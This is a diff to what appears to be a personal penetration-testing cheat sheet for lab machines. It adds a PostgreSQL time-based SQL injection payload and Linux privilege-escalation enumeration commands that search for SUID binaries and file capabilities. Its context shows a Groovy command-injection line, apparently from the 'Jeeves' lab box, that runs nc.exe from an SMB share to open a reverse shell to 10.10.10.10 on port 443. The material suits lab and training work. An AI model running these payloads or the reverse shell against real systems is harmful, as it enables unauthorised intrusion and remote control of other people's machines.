@@ -9,6 +9,14 @@ openssl s_client -connect 10.10.10.250:443
 
 ## OWASP Top 10
 
+## SQL Injection
+
+### PostgreSQL Injection
+
+```command
+'; select pg_sleep(10);-- -
+```
+
 ## Command Injection
 
 ### Ask Jeeves
@@ -16,6 +24,17 @@ openssl s_client -connect 10.10.10.250:443
 ```powershell
 # Shared resource
 println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
+```
+------------------------------------------------------------------------------------------------------
+# Linux Section
+
+## Enumeration
+
+```shell
+# System Enumeration
+find / -name file 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
 ```
 ------------------------------------------------------------------------------------------------------
 # Windows Section
